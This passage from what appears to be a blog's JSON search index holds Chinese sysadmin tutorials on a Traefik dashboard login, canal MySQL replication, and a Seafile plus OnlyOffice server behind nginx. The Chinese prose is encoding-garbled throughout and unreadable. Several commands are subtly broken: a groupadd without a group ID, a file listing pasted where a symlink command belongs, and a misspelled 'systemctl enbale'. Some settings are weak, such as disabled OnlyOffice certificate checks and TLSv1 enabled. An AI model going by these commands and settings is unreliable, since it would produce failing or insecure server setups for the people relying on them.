4 rule: \u0026#34;PathPrefix(`/api`) || PathPrefix(`/dashboard`)\u0026#34; 5 service: api@internal 6 entryPoints: 7 - http 8 middlewares: 9 - dashboard-login 10 11 middlewares: 12 dashboard-login: 13 basicAuth: 14 users: 15 - \u0026#34;admin:$apr1$u1xEoYqW$V5O5t4rmdly58WqS4nTVq1\u0026#34; æ‰“å¼€http://192.168.85.202/dashboard/#/\nuser: admin pass: xxxxxxxx\nè¿™æ ·å°±å¯ä»¥äº†\n","date":"2023-01-31","img":"","permalink":"https://rendoumi.com/posts/20230131-traefik_certificate/","series":null,"tags":null,"title":"Traefikè‡ªåŠ¨ç­¾å‘å¹¶ç»­è´¹è¯ä¹¦+ç«¯å£è½¬å‘"},{"categories":null,"content":"æ™®éçš„å¤§æ•°æ®æŠ½æ•°çš„æ–¹å¼éƒ½æ˜¯ä»æ•£è½åœ¨å„ä¸ªåœ°æ–¹çš„ MySQL æ•°æ®åº“ä¸­å¼€è´¦å·ï¼Œç„¶åæŠŠæ•°æ®åŒæ­¥è¿‡æ¥ã€‚\nè¿™ä¸ï¼Œå¤§æ•°æ®çš„åŒäº‹æå‡ºäº†ä¸€ä¸ªéœ€æ±‚ï¼Œæƒ³æŠŠæŸä¸ªåº“ä¸­çš„æŸä¸ªè¡¨çš„æ•°æ®å•ç‹¬åŒæ­¥åˆ°å¤§æ•°æ®çš„ç»Ÿä¸€åº“ä¸­çš„æŸä¸ªè¡¨ä¸­ã€‚\nç ”ç©¶äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œcanal çš„é…ç½®å¯¹è¿ç»´æ¥è¯´éå¸¸çš„ä¸å‹å¥½ï¼Œé™¤éç”¨å®ƒé‚£ä¸ª admin çš„ dashboardï¼Œä½†æ˜¯è¿ç»´é€šå¸¸æ˜¯ cli ç•Œé¢ï¼Œè°æ²¡äº‹è£…ä¸ª dashboard æ¥é…ç½®å‘¢ï¼Œå¤ª low äº†ã€‚\nç”¨çš„æ˜¯ canal 1.1.5 çš„ç‰ˆæœ¬ï¼Œä¸èƒ½å‡çº§ï¼Œå‡çº§å java ä¸å¯¹äº†ã€‚è¿˜æ²¡æœ‰åˆ°ç”¨ 1.1.6 çš„æ—¶å€™ï¼\nèƒŒæ™¯ï¼š\n1æºæ•°æ®åº“ï¼š10.8.2.12 2åº“ï¼šxxl_job 3è¡¨ï¼šdemotable666 4 5ç›®çš„æ•°æ®åº“ï¼š10.8.2.17 6åº“ï¼šxxl_job_bak 7è¡¨ï¼šdemotable666 è€Œä¸”ä¸ç”¨ä»»ä½•çš„Zookeeperã€Kafkaã€RabbitMQçš„ä¸­é—´ä»¶ï¼Œè¶Šç®€æ´è¶Šå¥½ã€‚\nä¸€ã€å®‰è£…canal 1wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz 2wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.adapter-1.1.5.tar.gz 3 4#éƒ½è£…åˆ° /app ç›®å½•ä¸‹ 5mkdir /app 6mkdir /app/deploy 7mkdir /app/adapter 8 9cd /app/deploy 10tar zxvf canal.deployer-1.1.5.tar.gz 11 12cd /app/adapter 13tar zxvf canal.adapter-1.1.5.tar.gz äºŒã€MySQLæºå‡†å¤‡ 1# /etc/my.cnf åŠ å…¥ä»¥ä¸‹å‡ é¡¹å¹¶é‡å¯ 2[mysqld] 3log-bin=mysql-bin # Start log bin. 4binlog_format=ROW # Log format. 5server-id=1 # Server id,different from slave. æˆæƒbinlogåŒæ­¥ï¼š\n1# åˆ›å»ºç”¨æˆ·æˆæƒ 2mysql\u0026gt; CREATE USER canal IDENTIFIED BY \u0026#39;canal\u0026#39;; 3mysql\u0026gt; GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO \u0026#39;canal\u0026#39;@\u0026#39;10.8.2.17\u0026#39; identified by \u0026#34;xxxxxx\u0026#34;; 4mysql\u0026gt; FLUSH PRIVILEGES; 5# æŸ¥çœ‹æˆæƒ 6mysql\u0026gt; show grants for \u0026#39;canal\u0026#39;; ä¸‰ã€é…ç½®deploy å…¶å®å…³é”®å°±æ˜¯ä¸¤ä¸ªé…ç½®\n1ã€canal.properties\n1mkdir /app/deploy/conf/10.8.2.12 2cp /app/deploy/conf/example/instance.properties /app/deploy/conf/10.8.2.12 3 4vi /app/deploy/conf/canal.properties 5 6#å°±æ”¹ä¸¤ä¸ªåœ°æ–¹ 7canal.destinations = 10.8.2.12 8canal.auto.scan = false æ³¨æ„ï¼Œä¸Šé¢ä¸€å®šè¦æŠŠ canal.auto.scan ä¿®æ”¹æˆ falseï¼Œå¦åˆ™å®ƒä¼šè‡ªåŠ¨æ‰«æ conf ç›®å½•ä¸‹çš„æ‰€æœ‰é…ç½®ï¼Œè¿™æ · example å­ç›®å½•æ— è®ºæ˜¯å¦æœ‰ç”¨åˆ°ï¼Œé…ç½®éƒ½ä¼šè¢«æ‰«è¿›å»ã€‚è¿™ä¸æ˜¯ç¥ç»ç—…ä¹ˆï¼Œå…¸å‹çš„ java ç¨‹åºçŒ¿è‡ªä»¥ä¸ºæ˜¯çš„é…ç½®ã€‚\n2ã€instance.properties çš„é…ç½®\n1vi /app/deploy/conf/10.8.2.12/instance.properties 2 3# instance.properties æ˜¯æ‹·è´exampleç›®å½•ä¸­çš„ 4# æ”¹åŠ¨ 5 6canal.instance.master.address=10.8.2.12:3306 7canal.instance.tsdb.enable=false 8 9# username/password 10canal.instance.dbUsername=canal 11canal.instance.dbPassword=xxxxxx 12 13# table regex 14#1. æ‰€æœ‰è¡¨ï¼š.* or .*\\\\..* 15#2. canal schemaä¸‹æ‰€æœ‰è¡¨ï¼š canal\\\\..* 16#3. canalä¸‹çš„ä»¥canalæ‰“å¤´çš„è¡¨ï¼šcanal\\\\.canal.* 17#4. canal schemaä¸‹çš„ä¸€å¼ è¡¨ï¼šcanal\\\\.test1 18#5. å¤šä¸ªè§„åˆ™ç»„åˆä½¿ç”¨ï¼šcanal\\\\..*,mysql.test1,mysql.test2 (é€—å·åˆ†éš”) 19#canal.instance.filter.regex=.*\\\\..* 20canal.instance.filter.regex=xxl_job\\\\..* ä¸Šé¢å…¶å®å°±æ˜¯è®¾ç½®äº† canal å»ä¼ªè£…æˆä¸€ä¸ª slaveï¼Œè¯»å– binlog æ—¥å¿—ï¼Œå¹¶ä¸”è¿‡æ»¤åªè¯»å– xxl_job çš„æ—¥å¿—ã€‚\nå¯åŠ¨ deploy\n1cd /app/deploy/bin 2./startup.sh çœ‹çœ‹æ—¥å¿—æ— å¼‚å¸¸å³å¯ï¼š\nå››ã€å‡†å¤‡å¥½ç›®çš„æ•°æ®åº“çš„åº“è¡¨ç»“æ„ æºæ•°æ®åº“å·²ç»æœ‰ demotable666 çš„è¡¨äº†ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç›®çš„æ•°æ®åº“äº‹å…ˆå‡†å¤‡å¥½ demotable666\n1# åœ¨ 10.8.2.17 çš„ xxl_job_bak åº“ä¸Šæ‰§è¡Œ 2mysql\u0026gt; use xxl_job_bak; 3mysql\u0026gt; create table demotable666( 4 UserId int NOT NULL AUTO_INCREMENT PRIMARY KEY, 5 UserName varchar(100), 6 UserLoginDate date NOT NULL 7); 8Query OK, 0 rows affected (0.04 sec) äº”ã€è®¾ç½®adapter 1ã€application.yml\né¦–å…ˆç»™ canal çš„æœºå™¨å¯¹ç›®çš„åº“èµ‹ mysql æƒ\n1mysql\u0026gt; grant all privileges on xxl_job_bak.* to sync_17@\u0026#39;%\u0026#39; identified by \u0026#34;xxxxxx\u0026#34;; 2mysql\u0026gt; flush privileges; ç„¶åç¼–è¾‘application.yml\n1vi /app/adapter/conf/application.yml 2 3#æ³¨é‡Šæ‰srcDataSourcesï¼Œmysql åŒæ­¥åˆ° mysqlçš„åœºæ™¯ä¸­å®Œå…¨ç”¨ä¸åˆ°è¿™ä¸ªï¼Œesè¦ç”¨åˆ° 4# srcDataSources: 5# defaultDS: 6# url: jdbc:mysql://127.0.0.1:3306/mytest?useUnicode=true 7# username: root 8# password: 121212 9 10 canalAdapters: 11 - instance: 10.8.2.12 # canal instance Name or mq topic name 12 groups: 13 - groupId: g1 14 outerAdapters: 15 - name: logger 16 - name: rdb 17 key: mysqlbak1 18 properties: 19 jdbc.driverClassName: com.mysql.jdbc.Driver 20 jdbc.url: jdbc:mysql://10.8.2.17:3306/xxl_job_bak?useUnicode=true 21 jdbc.username: sync_17 22 jdbc.password: xxxxxx æ³¨æ„ä¸Šé¢é…çš„instanceï¼Œè¿™ä¸ªè·Ÿdeployé‡Œé¢çš„instanceæ²¡æœ‰åŠæ¯›é’±å…³ç³»ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†rdbé‡Œé¢çš„é…ç½®å‚è€ƒç”¨çš„ã€‚\n2ã€ç¼–è¾‘è¡¨åŒæ­¥é…ç½®æ–‡ä»¶mysqlbak1.yml\næ³¨æ„ä¸Šé¢çš„jdbc.urlæŒ‡å®šäº†åº“æ˜¯xxl_job_bakï¼Œæ‰€ä»¥ä¸‹é¢é…ç½®çš„ targetTable å°±æ˜¯å•ç‹¬ä¸€ä¸ª demotable666ï¼Œå¾ˆå¤šæ–‡ç« é‡Œå†™åº“å.è¡¨åï¼Œ xxl_job_bak.demotable666ï¼Œå…«æˆ’æ˜¯æ²¡è¿™æ ·æˆåŠŸã€‚\n1#ç”¨ä¸åˆ°çš„æŒªæˆå¤‡ä»½ 2mv /app/adapter/conf/rdb/mytest_user.yml /app/adapter/conf/rdb/mytest_user.bak 3 4vi /app/adapter/conf/rdb/mysqlbak1.yml 5#dataSourceKey: mysqlbakDS1 6# cannalçš„instanceæˆ–è€…MQçš„topic 7destination: 10.8.2.12 8groupId: g1 9outerAdapterKey: mysqlbak1 10concurrent: true 11 12dbMapping: 13 database: xxl_job 14 table: demotable666 15 targetTable: demotable666 16 targetPk: 17 UserId: UserId 18# mapAll: true 19 targetColumns: 20 UserId: 21 UserName: 22 UserLoginDate: 23# etlCondition: \u0026#34;where c_time\u0026gt;={}\u0026#34; 24 commitBatch: 1 # æ‰¹é‡æäº¤çš„å¤§å° å¯åŠ¨ adapterï¼š\n1cd /app/adapter/bin 2./startup.sh è¿™æ ·å°±å¥½äº†ã€‚\nåœ¨10.8.2.12çš„æºæ•°æ®åº“ä¸Šæ’å…¥æ•°æ®ï¼š\n1insert into demotable666(UserName,UserLoginDate) values(\u0026#39;john\u0026#39;,DATE(NOW())); åœ¨ 10.8.2.17 å¯ä»¥çœ‹åˆ°æ–°æ•°æ®è‡ªåŠ¨è¿‡æ¥äº†ï¼Œè¿™æ ·å°±æå®šäº†ã€‚\nå…­ã€æ‹“å±•æ•´åº“åŒæ­¥ ä¸Šé¢æˆ‘ä»¬å®ç°äº†è¡¨åŒæ­¥ï¼Œä¸‹é¢æ‹“å±•è¯´ä¸€ä¸‹å¦‚ä½•å®ç°æ•´åº“çš„åŒæ­¥ï¼š\n1ã€è®¾ç½®application.ymlï¼Œrdbå¢åŠ ä¸€ä¸ªkey: mysqlbak2ï¼Œjdbc.url è¿æ¥ä¸²ä¸è®¾ç½®åº“å\n1 canalAdapters: 2 - instance: 10.8.2.12 # canal instance Name or mq topic name 3 groups: 4 - groupId: g1 5 outerAdapters: 6 - name: logger 7 - name: rdb 8 key: mysqlbak1 9 properties: 10 jdbc.driverClassName: com.mysql.jdbc.Driver 11 jdbc.url: jdbc:mysql://10.8.2.17:3306/xxl_job_bak?useUnicode=true 12 jdbc.username: sync_17 13 jdbc.password: xxxxxx 14 - name: rdb 15 key: mysqlbak2 16 properties: 17 jdbc.driverClassName: com.mysql.jdbc.Driver 18 jdbc.url: jdbc:mysql://10.8.2.17:3306/?useUnicode=true 19 jdbc.username: sync_17 20 jdbc.password: xxxxxx 2ã€ç¼–è¾‘è¡¨åŒæ­¥é…ç½®æ–‡ä»¶mysqlbak2.yml\næ³¨æ„ï¼Œé‡Œé¢å…¶å®åªæœ‰ä¸€ä¸ªé…ç½®èµ·ä½œç”¨ databaseï¼Œè€Œä¸”ç›®çš„åº“ä¸­å¿…é¡»äº‹å…ˆå»ºç«‹å¥½xxl_jobçš„åº“è¡¨ç»“æ„ï¼Œåº“åä¹Ÿå¿…é¡»å’Œæºä¸­åº“åå®Œå…¨ä¸€è‡´ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œä» xxl_job åªèƒ½åŒæ­¥åˆ° xxl_jobï¼Œä¸èƒ½ä»xxl_jobåŒæ­¥åˆ°xxl_jobbakä¸­ã€‚\n1#dataSourceKey: defaultDS 2# cannalçš„instanceæˆ–è€…MQçš„topic 3destination: 10.8.2.12 4groupId: g1 5outerAdapterKey: mysqlbak2 6concurrent: true 7 8dbMapping: 9 mirrorDb: true 10 database: xxl_job ç„¶åæˆ‘ä»¬çœ‹ 10.8.2.17 ä¸Šé¢ xxl_job åº“é‡Œçš„æ•°æ®å°±ä¼šå¢é‡å¼€å§‹è·Ÿæºåº“åŒæ­¥äº†ã€‚\n","date":"2023-01-15","img":"","permalink":"https://rendoumi.com/posts/20230115-canal_mysql/","series":null,"tags":null,"title":"è¿ç»´æ–¹æ¡ˆä¹‹canalæ•°æ®åº“åŒæ­¥"},{"categories":null,"content":"ä¹‹å‰å…¬å¸ä¸€ç›´ç”¨çš„æ˜¯ seafile æ¥ä¿å­˜æ–‡æ¡£ï¼Œéå¸¸å¥½ç”¨ï¼Œä¹Ÿå‡ºè¿‡ä¸€æ¬¡å¤§äº‹ï¼Œä¸€ä¸ªç¦»èŒçš„å‘˜å·¥æ¸…ç©ºç”µè„‘ï¼Œç„¶åç›´æ¥æŠŠsefaileæ–‡ä»¶å¤¹ä¹ŸåŒæ­¥æ¸…ç©ºäº†ï¼Œå¥½åœ¨æœ‰ç‰ˆæœ¬ï¼Œæœ€åæ‰¾äº†å›æ¥ã€‚\næ¢åˆ°æ–°å…¬å¸ï¼Œè´¢åŠ¡ä¹Ÿæäº†å…±äº«äº‘ç›˜çš„è¦æ±‚ï¼Œè¿˜è¦æ±‚èƒ½å¤šäººåŒæ—¶åœ¨çº¿ç¼–è¾‘ã€‚\né‚£å°±è¯•ç€æ­å»º seafile + onlyoffice äº†ï¼ŒåŒæ—¶è¦æ±‚æé«˜å®‰å…¨æ€§ï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œæ²¡å‡ ä¸ªå¯¹çš„ï¼Œå°¤å…¶æ˜¯å¯¹httpsè¿™ä¸€å—ï¼ŒèŠ±äº†2å¤©æ—¶é—´æ­å»ºï¼Œè®°å½•ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼š\nä¸€ã€ä¸‹è½½seafileï¼š æ²¡æœ‰é€‰å®šé«˜ç‰ˆæœ¬çš„ï¼Œæœ€æ–°ç‰ˆæœ¬çš„å˜åŒ–å¤ªå¤šï¼Œç¼ºçœå…¨éƒ¨éƒ½å®‰è£…åˆ° /app ç›®å½•ä¸‹\n1wget https://download.seadrive.org/seafile-server_7.0.0_x86-64.tar.gz 2tar zxvf seafile-server_7.0.0_x86-64.tar.gz 3mkdir /app 4mv seafile-server-7.0.0 /app äºŒã€è®¾å®šCentOS7 ä¾ç„¶æ´»åœ¨ CentOS 7.10 çš„æ—¶ä»£ï¼Œå†å¾€ä¸Šå‡çº§ï¼Œè¦å‡åˆ° rokey linux äº†\næé†’ï¼šseafile çš„å®‰è£…æ ¹æ®ç‰ˆæœ¬ä¸åŒï¼Œyum è£…çš„ä¸œè¥¿ä¹Ÿä¸å°½ç„¶ç›¸åŒçš„ï¼Œè¦å»å®˜æ–¹æ–‡æ¡£çœ‹\n1yum install python python-setuptools MySQL-python python-urllib3 python-ldap -y ä¸‰ã€å®‰è£…MySQLæ•°æ®åº“ è¿™ä¸ªå°±ä»è€…è§ä»ã€æ™ºè€…è§æ™ºäº†ï¼Œæˆ‘ç°åœ¨çš„æ–¹å¼éƒ½æ˜¯äºŒè¿›åˆ¶è£…ï¼Œé€‰ç”¨çš„æ˜¯ mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz å®‰è£…çš„ï¼Œ\n1tar zxvf mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz 2mv mysql-5.6.51-linux-glibc2.12-x86_64 /app 3 4yum -y install autoconf libaio* 5 6cat\u0026lt;\u0026lt;EOF\u0026gt;/etc/my.cnf 7[mysql] 8# è®¾ç½®mysqlå®¢æˆ·ç«¯é»˜è®¤å­—ç¬¦é›† 9default-character-set=utf8 10socket=/tmp/mysql.sock 11 12[mysqld] 13skip-name-resolve 14#è®¾ç½®3306ç«¯å£ 15port = 3306 16socket=/tmp/mysql.sock 17# è®¾ç½®mysqlçš„å®‰è£…ç›®å½• 18basedir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/ 19# è®¾ç½®mysqlæ•°æ®åº“çš„æ•°æ®çš„å­˜æ”¾ç›®å½• 20datadir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/data 21# å…è®¸æœ€å¤§è¿æ¥æ•° 22max_connections=200 23# æœåŠ¡ç«¯ä½¿ç”¨çš„å­—ç¬¦é›†é»˜è®¤ä¸º8æ¯”ç‰¹ç¼–ç çš„latin1å­—ç¬¦é›† 24character-set-server=utf8 25# åˆ›å»ºæ–°è¡¨æ—¶å°†ä½¿ç”¨çš„é»˜è®¤å­˜å‚¨å¼•æ“ 26default-storage-engine=INNODB 27#lower_case_table_name=1 28max_allowed_packet=16M 29sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES 30EOF 31 32groupadd -g mysql 33useradd -g mysql mysql 34 35# åˆå§‹åŒ–DB 36cd /app/mysql-5.6.51-linux-glibc2.12-x86_64/ 37/app/mysql-5.6.51-linux-glibc2.12-x86_64/scripts/mysql_install_db --user=mysql 38 39#å»ºç«‹ /etc/init.d/mysql çš„è½¯é“¾æ¥ 40mysql -\u0026gt; /app/mysql-5.6.51/support-files/mysql.server 41 42#å¯åŠ¨ 43/etc/init.d/mysql start 44 45# å®‰å…¨è®¾ç½®DB 46cd /app/mysql-5.6.51-linux-glibc2.12-x86_64/ 47/app/mysql-5.6.51-linux-glibc2.12-x86_64/bin/mysql_secure_installation å››ã€å‡†å¤‡onlyoffice è¿™é‡Œæœ‰å¤§å‘å•Šï¼Œå…¶å®onlyofficeçš„ç‰ˆæœ¬ä¸‡ä¸‡ä¸èƒ½ç”¨æœ€æ–°çš„ï¼Œå› ä¸ºJWTçš„Tokenè®¤è¯\næ‰€ä»¥å¿…é¡»ç”¨ä½ç‰ˆæœ¬çš„ï¼Œç„¶åå‘¢ç”±äºå®ƒå…¶å®æ˜¯ä¸€ç»„ç¨‹åºï¼Œè°ƒç”¨çš„æ—¶å€™åˆæ˜¯åªç”¨webï¼Œæ‰€ä»¥å°åœ¨dockeré‡Œæœ€å¥½\n1cd /etc/yum.repos.d/ 2wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 3 4yum -y install docker-ce 5systemctl enable --now docker.service 6 7#å‡†å¤‡å¥½è¯ä¹¦ç›®å½• 8mkdir /app/onlyoffice/certs 9#ç”¨legoç”³è¯·å¥½çš„let\u0026#39;s encryptå…è´¹è¯ä¹¦æˆ–è€…æ­£å¼è¯ä¹¦ 10#åªèƒ½å«è¿™ä¸¤ä¸ªåå­—ï¼Œå…¶ä»–ä¸è¡Œï¼ï¼ï¼ï¼ 11onlyoffice.crt 12onlyoffice.key 13#ç”Ÿæˆdh 14cd /app/onlyoffice/certs 15openssl dhparam -out dhparam.pem 2048 16 17#è·‘å®¹å™¨ 18docker run -i -t -d -p 8443:443 --restart=always -v /app/onlyoffice:/var/www/onlyoffice/Data onlyoffice/documentserver:6.4.2.6 æˆ‘ä»¬è¿™é‡Œé€‰ç”¨ onlyoffice 6.4.2.6 ç‰ˆæœ¬çš„ï¼ŒåŒæ—¶æ‰“å¼€8443:443çš„ç«¯å£ï¼Œæ„å‘³ç€æˆ‘ä»¬å‡†å¤‡è¦è·‘httpsï¼Œç„¶åonlyofficeçš„è¯ä¹¦æ˜¯å¦‚ä¸Šçš„è®¾å®šæ–¹æ³•ï¼Œç½‘ä¸Šä¸€å †èƒ¡è¯´å…«é“ç›´æ¥æ”¾å¼€443ä½†æ˜¯æ— è¯ä¹¦çš„ï¼Œæœ‰çš„è¿˜è¦è¿›å»dockeræ”¹ï¼Œéƒ½ä¸å¯¹ã€‚\näº”ã€å®‰è£…seafile è¿™ä¸ªå¾ˆç®€å•ï¼Œä½†ä¹Ÿå¾ˆå‘\n1cd /app/seafile-server-7.0.0/ 2./setup-seafile-mysql.sh 3 4#å›ç­”é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªç­”ï¼š 5seafile 6#ç¬¬äºŒä¸ªç­”åŸŸåï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯çœŸçš„ç”¨åŸŸå 7seafile.rendoumi.com 8#å‰©ä¸‹é€‰å›è½¦ è¿™é‡Œé‡åˆ°ä¸ªå¤§å‘ï¼Œç”±äºæˆ‘ä»¬mysqlå®‰è£…é€‰æ‹©äº†secureçš„æ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå®‰ä¸è¿‡å»\næŠ¥seafileç”¨æˆ·æ— æƒé™ï¼Œæ²¡åŠæ³•ï¼Œç”¨navicatï¼Œè¿›å»çœ‹ç”¨æˆ·ï¼Œå®‰è£…è„šæœ¬ç»™æˆ‘ä»¬ç”Ÿæˆäº†ä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯æ˜¯localhostæƒé™çš„ï¼Œæˆ‘ä»¬æ”¹æˆ127.0.0.1ï¼Œç„¶åä¿å­˜\né‡æ–°å®‰è£…ï¼Œå°±å¯ä»¥å®‰è£…æˆåŠŸäº†ã€‚\nç„¶åå°±æ˜¯å…ˆåˆå§‹åŒ–ä¸€ä¸‹ï¼š\n1cd /app/seafile-server-latest/ 2 3./seafile.sh start 4 5#è®¾ç½®ç®¡ç†å‘˜å’Œå¯†ç  6./seahub.sh start 7 8ç„¶åéƒ½åœæ‰ 9./seahub.sh stop 10./seafile.sh stop å‡†å¤‡å®‰å…¨é…ç½®\n1cd /app/conf/ 2 3#vi ccnet.conf 4# NAMEå’ŒSERVIcE_URLå°±æ˜¯ä¸Šé¢å®‰è£…æ—¶æˆ‘ä»¬å›ç­”çš„2ä¸ªé—®é¢˜ 5NAME = seafile 6SERVICE_URL = https://seafile.rendoumi.com 7 8#vi seafile.conf 9# å¢åŠ hostç›‘å¬åœ°å€ä¸º127.0.0.1ï¼Œç¨åæˆ‘ä»¬è®¾ç½®nginxè½¬å‘ï¼Œæ›´åŠ å®‰å…¨ 10[fileserver] 11host = 127.0.0.1 12port = 8082 13 14#vi seahub_settings.py 15# å¢åŠ ä»¥ä¸‹å„é¡¹ï¼Œæœ‰onlyofficeçš„ï¼Œæœ‰8082çš„ 16FILE_SERVER_ROOT = \u0026#39;https://seafile.rendoumi.com/seafhttp\u0026#39; 17 18MAX_NUMBER_OF_FILES_FOR_FILEUPLOAD = 5000 19 20ENABLE_ONLYOFFICE = True 21VERIFY_ONLYOFFICE_CERTIFICATE = False 22ONLYOFFICE_APIJS_URL = \u0026#39;https://seafile.rendoumi.com:8443/web-apps/apps/api/documents/api.js\u0026#39; 23ONLYOFFICE_FILE_EXTENSION = (\u0026#39;doc\u0026#39;, \u0026#39;docx\u0026#39;, \u0026#39;ppt\u0026#39;, \u0026#39;pptx\u0026#39;, \u0026#39;xls\u0026#39;, \u0026#39;xlsx\u0026#39;, \u0026#39;odt\u0026#39;, \u0026#39;fodt\u0026#39;, \u0026#39;odp\u0026#39;, \u0026#39;fodp\u0026#39;, \u0026#39;ods\u0026#39;, \u0026#39;fods\u0026#39;) 24ONLYOFFICE_EDIT_FILE_EXTENSION = (\u0026#39;docx\u0026#39;, \u0026#39;pptx\u0026#39;, \u0026#39;xlsx\u0026#39;,\u0026#39;doc\u0026#39;,\u0026#39;xls\u0026#39;,\u0026#39;ppt\u0026#39;) å‡†å¤‡systemctlçš„å¯åŠ¨æ–‡ä»¶\n1cat \u0026lt;\u0026lt;EOF\u0026gt;/etc/systemd/system/seafile.service 2[Unit] 3Description=Seafile Server 4After=network.target mariadb.service 5 6[Service] 7Type=oneshot 8ExecStart=/app/seafile-server-latest/seafile.sh start 9ExecStart=/app/seafile-server-latest/seahub.sh start 10ExecStop=/app/seafile-server-latest/seafile.sh stop 11ExecStop=/app/seafile-server-latest/seahub.sh stop 12RemainAfterExit=yes 13User=root 14Group=root 15 16[Install] 17WantedBy=multi-user.target 18EOF ç„¶åæˆ‘ä»¬ç°åœ¨å¯ä»¥æ­£å¼å¯åŠ¨seafileäº†\n1systemctl daemon-reload 2systemctl start seafile å…­ã€å®‰è£…nginx 1yum -y install epel-release 2yum -y install nginx 3 4# ç”Ÿæˆdh 5cd /etc/nginx/ 6openssl dhparam -out dhparam.pem 2048 7 8vi /etc/nginx/nginx.conf 9 10#å¢åŠ ä»¥ä¸‹è¿™ä¸ªå¤§æ®µ 11 server { 12 listen 80; 13 server_name seafile.rendoumi.com; 14 rewrite ^ https://$http_host$request_uri? permanent; 15 } 16 17 server { 18 listen 443 ssl; 19 server_name seafile.rendoumi.com; 20 ssl_certificate /etc/nginx/seafile.crt; #cacert.pem æ–‡ä»¶è·¯å¾„ 21 ssl_certificate_key /etc/nginx/seafile.key; #privkey.pem æ–‡ä»¶è·¯å¾„ 22 ssl_dhparam /etc/nginx/dhparam.pem; 23 ssl_protocols TLSv1 TLSv1.1 TLSv1.2; 24 ssl_ciphers \u0026#39;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA256-SHA:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-SEED-SHA:DHE-RSA-CAMELLIA128-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS\u0026#39;; 25 ssl_prefer_server_ciphers on; 26 27 proxy_set_header X-Forwarded-For $remote_addr; 28 29 add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34;; 30 server_tokens off; 31 32 location / { 33 proxy_pass http://127.0.0.1:8000; 34 proxy_set_header Host $host; 35 proxy_set_header X-Real-IP $remote_addr; 36 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 37 proxy_set_header X-Forwarded-Host $server_name; 38 proxy_set_header X-Forwarded-Proto https; 39 40 access_log /var/log/nginx/seahub.access.log; 41 error_log /var/log/nginx/seahub.error.log; 42 proxy_read_timeout 1200s; 43 client_max_body_size 0; 44 } 45 46 location /seafhttp { 47 rewrite ^/seafhttp(.*)$ $1 break; 48 proxy_pass http://127.0.0.1:8082; 49 client_max_body_size 0; 50 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 51 proxy_connect_timeout 36000s; 52 proxy_read_timeout 36000s; 53 proxy_send_timeout 36000s; 54 send_timeout 36000s; 55 } 56 57 location /media { 58 root /app/seafile-server-latest/seahub; #seahubçš„è·¯å¾„ 59 } 60 61 } ä»¥ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œseafileå®é™…ç›‘å¬äº†127.0.0.1:8000å’Œ127.0.0.1:8082ç«¯å£ï¼Œè¢«ä»£ç†åˆ°äº†nginxï¼Œè¿™æ ·ç›‘å¬åœ¨æœ¬åœ°ï¼Œnginxå†å¥—ä¸Šhttpsè¯ä¹¦ï¼Œå°±å¾ˆå®‰å…¨äº†ï¼Œå¯åŠ¨\n1systemctl enbale --now nginx ä¸ƒã€è®¾ç½®seafile ç„¶åæˆ‘ä»¬ç™»å½• https://seafile.rendoumi.com, ä¿®æ”¹ä¸€ä¸‹é…ç½®\nç¡®ä¿è®¾ç½®æ­£ç¡®ï¼š\n1SERVICE_URLè®¾ç½®çš„æ˜¯ `https://seafile.rendoumi.com` 2FILE_SERVER_ROOT è®¾ç½®çš„æ˜¯ `https://seafile.rendoumi.com/seafhttp` ç„¶åå°±å¯ä»¥äº†ï¼Œseafileå°±å¯ä»¥åœ¨çº¿ç¼–è¾‘äº†ã€‚\nå…«ã€é™„åŠ onlyofficeä¿®æ”¹ æˆ‘ä»¬è¿˜éœ€è¦å¢åŠ ä¸€ç‚¹ç‰¹è‰²ï¼Œç»™onlyofficeåšä¸€äº›ä¿®æ”¹ï¼š\n1ã€è‡ªåŠ¨ä¿å­˜\nè¿›å…¥onlyofficeå®¹å™¨\n1docker exec -it å®¹å™¨ /bin/bash 2 3echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone 4ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 5date -R 6 7nano /etc/onlyoffice/documentserver/local.json 8{ 9 \u0026#34;services\u0026#34;: { 10 \u0026#34;CoAuthoring\u0026#34;: { 11 // åœ¨ CoAuthoring ä¸­ å¢åŠ  autoAssembly å±æ€§é…ç½® 12 \u0026#34;autoAssembly\u0026#34;: { 13 \u0026#34;enable\u0026#34;: true, 14 \u0026#34;interval\u0026#34;: \u0026#34;5m\u0026#34; 15 }, 